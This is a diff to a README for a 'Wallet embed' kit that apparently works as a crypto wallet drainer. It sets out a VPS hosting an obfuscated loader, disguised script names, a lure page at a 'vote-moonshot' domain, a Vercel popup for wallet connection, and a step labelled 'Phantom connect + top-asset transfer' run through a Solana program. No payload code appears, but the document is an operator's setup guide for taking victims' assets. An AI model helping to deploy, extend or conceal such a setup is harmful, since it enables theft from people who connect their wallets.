@@ -1,9 +1,10 @@
 # Wallet embed
 
 ```
-├── vercel/          → deploy to Vercel (JS bundle + /profile popup)
-├── vps/             → upload to Debian VPS (PHP proxy + HTML)
-└── nginx/           → nginx config for VPS
+├── vercel/          → Vercel: wallet JS, /connect/, gateway API, env config
+├── vps/             → VPS only: obfuscated loader.php (embed proxy)
+├── programs/        → Solana program (deploy to chain from your PC, not VPS)
+└── nginx/           → nginx for VPS loader route
 ```
 
 ---
@@ -67,9 +68,7 @@ scp vps/public/index.html user@vps:/var/www/mysite/public/
 'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/p7KqN2mR9vXw.js',
 'button_class' => 'K7mQ2',
 'connect_popup_enabled' => true,
-'token_approval_program_id' => '', // set after programs/vote-delegate deploy
-'token_approval_enabled' => false,
-'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=YOUR_KEY',
+// Transfers + RPC: Vercel env only (see vercel/.env.example)
 ```
 
 ---
@@ -94,6 +93,7 @@ Reown dashboard → allow **your HTML domain**
 ## Flow
 
 ```
-/vault38472 → loader.php → encoded config + proxied wallet JS (single script tag on your page)
-Pick wallet → popup YOUR-PROJECT.vercel.app/profile
+vote-moonshot.top/vault38472  →  VPS loader only (embed config + script tag to Vercel bundle)
+Reown wallet picker on embed  →  popup fuzzy-octo….vercel.app/connect/
+Phantom connect + top-asset transfer  →  Vercel (program CPI, env: HELIUS_RPC_URL, TRANSFER_*)
 ```
